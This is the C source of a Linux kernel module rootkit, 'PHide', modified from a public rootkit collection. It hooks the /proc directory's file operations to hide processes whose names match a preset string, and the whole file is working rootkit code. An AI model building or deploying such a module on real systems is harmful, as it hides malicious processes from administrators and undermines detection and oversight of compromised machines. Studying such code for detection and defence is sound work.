/* NO LONGER ORIGINAL,  THIS IS A MODIFIED VERSION OF NISAY759'S ROOTKIT GET THE ORIGINAL FROM HERE nisay759/linux-rootkits  */

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/fs.h>

#include <linux/proc_fs.h>

static int __init phide_init(void);
static void __exit phide_exit(void);

module_init(phide_init);
module_exit(phide_exit);

static char *proc_to_hide = "1";
static struct file_operations proc_fops;
static struct file_operations *backup_proc_fops;
static struct inode *proc_inode;
static struct path p;

struct dir_context *backup_ctx;

static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
        loff_t off, u64 ino, unsigned int d_type)
{
    if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
        return 0;

    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
}

struct dir_context rk_ctx = {
    .actor = rk_filldir_t,
};

int rk_iterate_shared(struct file *file, struct dir_context *ctx)
{
    int result = 0;
    rk_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    result = backup_proc_fops->iterate_shared(file, &rk_ctx);
    ctx->pos = rk_ctx.pos;

    return result;
}

static int __init phide_init(void)
{
    printk(KERN_INFO "PHide: LKM succefully loaded!\n");

    /* fetch the procfs entry */
    if(kern_path("/proc", 0, &p))
        return 0;

    /* get the inode*/
    proc_inode = p.dentry->d_inode;

    /* get a copy of file_operations from inode */
    proc_fops = *proc_inode->i_fop;
    /* backup the file_operations */
    backup_proc_fops = proc_inode->i_fop;
    /* modify the copy with out evil function */
    proc_fops.iterate_shared = rk_iterate_shared;
    /* overwrite the active file_operations */
    proc_inode->i_fop = &proc_fops;

    return 0;
}

static void __exit phide_exit(void)
{
    if(kern_path("/proc", 0, &p))
        return;
    proc_inode = p.dentry->d_inode;
    proc_inode->i_fop = backup_proc_fops;

    printk(KERN_INFO "PHide: LKM succefully unloaded!\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("nisay");
MODULE_VERSION("0.1");
